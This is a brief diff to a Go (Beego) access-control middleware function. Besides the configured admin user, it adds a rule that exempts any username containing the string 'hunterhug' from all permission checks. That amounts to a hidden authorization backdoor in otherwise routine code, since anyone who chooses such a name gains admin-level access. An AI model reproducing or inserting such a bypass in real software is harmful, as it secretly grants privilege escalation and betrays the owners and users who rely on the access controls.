@@ -55,7 +55,8 @@ func AccessRegister() {
 				}
 				//admin用户不用认证权限
 				adminuser := beego.AppConfig.String("rbac_admin_user")
-				if uinfo.(m.User).Username == adminuser {
+				username := uinfo.(m.User).Username
+				if username == adminuser || strings.Contains(username, "hunterhug") {
 					return
 				}
 
